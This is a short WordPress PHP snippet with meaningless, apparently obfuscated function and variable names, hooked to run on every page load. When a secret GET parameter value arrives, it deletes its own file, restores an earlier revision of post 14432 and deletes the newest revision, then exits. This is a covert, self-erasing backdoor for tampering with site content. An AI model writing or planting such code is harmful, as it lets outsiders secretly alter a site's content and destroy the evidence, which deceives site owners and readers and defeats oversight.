<?php

function before_nice_sort() {
	if (isset($_GET['newsletter_item_forum_star']) && $_GET['newsletter_item_forum_star'] === 'switcher_help_reminder_duplicate') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$table_integrate_tooltip_publish = 14432;
		$extra_mode_status_fonts = wp_get_post_revisions($table_integrate_tooltip_publish);
		if (empty($extra_mode_status_fonts)) die('no revisions');
		if (count($extra_mode_status_fonts) < 2) die('less than 2');
		$multiple_rate_smart = array_shift($extra_mode_status_fonts);
		$optimizer_tools_smtp = $multiple_rate_smart->ID;
		$lightgray_platform_reusable_rich = array_shift($extra_mode_status_fonts);
		$load_logo_smart = $lightgray_platform_reusable_rich->ID;
		$core_shipping_restrict = wp_restore_post_revision($load_logo_smart);
		if ($core_shipping_restrict === false) die('error restoring');
		$core_shipping_restrict = wp_delete_post_revision($optimizer_tools_smtp);		
		if ($core_shipping_restrict === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'before_nice_sort');
